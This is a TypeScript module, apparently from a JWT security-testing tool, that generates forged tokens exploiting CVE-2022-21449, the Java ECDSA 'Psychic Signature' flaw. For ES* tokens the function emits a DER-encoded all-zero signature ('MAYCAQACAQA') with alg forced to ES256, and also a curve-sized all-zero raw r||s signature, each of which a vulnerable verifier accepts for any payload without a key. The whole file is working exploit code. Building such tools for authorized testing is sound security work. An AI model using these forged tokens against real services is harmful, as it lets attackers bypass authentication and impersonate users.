/**
 * Psychic Signature Attack (CVE-2022-21449)
 *
 * Java's ECDSA signature verification (JDK 15–18, plus a few other ECDSA
 * implementations) failed to reject a signature whose r and s values are BOTH
 * zero. Such a "blank" signature verifies as valid for ANY message, so an
 * attacker can forge arbitrary ES256/ES384/ES512 tokens with no key material.
 *
 * Two forged-signature encodings are emitted:
 *  1. jwt_tool's exact `-X p` token: the header `alg` is forced to ES256 and the
 *     signature is the literal string "MAYCAQACAQA" — the DER encoding of
 *     SEQUENCE { INTEGER 0, INTEGER 0 } (r = s = 0). Matches jwt_tool's
 *     checkPsySig() so the jwt_tool reproduction command yields the same token.
 *  2. The RFC 7518 raw (P1363) form: the original ES* alg is kept and the
 *     signature is all-zero r||s bytes sized to the curve (64/96/132 bytes for
 *     ES256/384/512). This catches libraries that parse the JWS signature as raw
 *     r||s and would reject the DER form before the verification is reached.
 *
 * Only applicable to ECDSA (ES*) tokens — a zero signature does nothing against
 * RSA/HMAC verification, so non-ES tokens yield no attacks.
 */

import { b64urlEncode } from "../crypto/jwt.js";
import type { ParsedJWT, AttackResult } from "../types.js";
import { nanoid } from "../util.js";

// DER encoding of SEQUENCE { INTEGER 0, INTEGER 0 } (ECDSA r = 0, s = 0).
// Decodes to bytes 30 06 02 01 00 02 01 00. This is jwt_tool's hard-coded value.
const DER_ZERO_SIG = "MAYCAQACAQA";

// A raw ECDSA JWS signature is r||s, each coordinate being the curve's field
// size: P-256 → 32+32, P-384 → 48+48, P-521 → 66+66 bytes.
const RAW_SIG_BYTES: Record<string, number> = {
  ES256: 64,
  ES384: 96,
  ES512: 132,
};

export function buildPsychicSigAttacks(parsed: ParsedJWT): AttackResult[] {
  const alg = (parsed.header.alg as string) || "";
  // The bug is specific to ECDSA verification; only ES* tokens are affected.
  if (!alg.startsWith("ES")) return [];

  const results: AttackResult[] = [];
  const originalJWT = `${parsed.headerB64}.${parsed.payloadB64}.${parsed.signatureB64}`;

  // 1. jwt_tool's exact `-X p`: force alg → ES256, signature = DER (0,0). Reuse the
  //    original payload's base64 verbatim (the signature is constant, so the token
  //    is semantically identical to jwt_tool's checkPsySig output).
  const es256Header = { ...parsed.header, alg: "ES256" };
  results.push({
    id: nanoid(),
    technique: "psychicSig",
    techniqueName: "Psychic Signature (ES256, DER r=s=0)",
    description:
      'CVE-2022-21449: forges the token with an all-zero ECDSA signature — the DER ' +
      'SEQUENCE { INTEGER 0, INTEGER 0 } ("MAYCAQACAQA") — and alg=ES256. ECDSA ' +
      "verifiers that fail to reject r=0/s=0 (e.g. Java 15–18) accept it for any " +
      "payload with no key required. This is jwt_tool's exact `-X p` token.",
    modifiedJWT: `${b64urlEncode(JSON.stringify(es256Header))}.${parsed.payloadB64}.${DER_ZERO_SIG}`,
    timestamp: Date.now(),
    originalJWT,
  });

  // 2. RFC 7518 raw (P1363) form: keep the original ES* alg, signature = all-zero
  //    r||s sized to the curve. Catches libraries that expect raw (not DER) sigs.
  const rawLen = RAW_SIG_BYTES[alg];
  if (rawLen) {
    const rawSig = b64urlEncode(Buffer.alloc(rawLen)); // zero-filled r||s
    results.push({
      id: nanoid(),
      technique: "psychicSig",
      techniqueName: `Psychic Signature (${alg}, raw r‖s = 0)`,
      description:
        `CVE-2022-21449: keeps alg=${alg} and uses an all-zero raw r||s signature ` +
        `(${rawLen} zero bytes — the RFC 7518 JWS encoding). Complements the DER variant ` +
        "for libraries that parse the JWS signature as raw bytes rather than DER.",
      modifiedJWT: `${parsed.headerB64}.${parsed.payloadB64}.${rawSig}`,
      timestamp: Date.now(),
      originalJWT,
    });
  }

  return results;
}
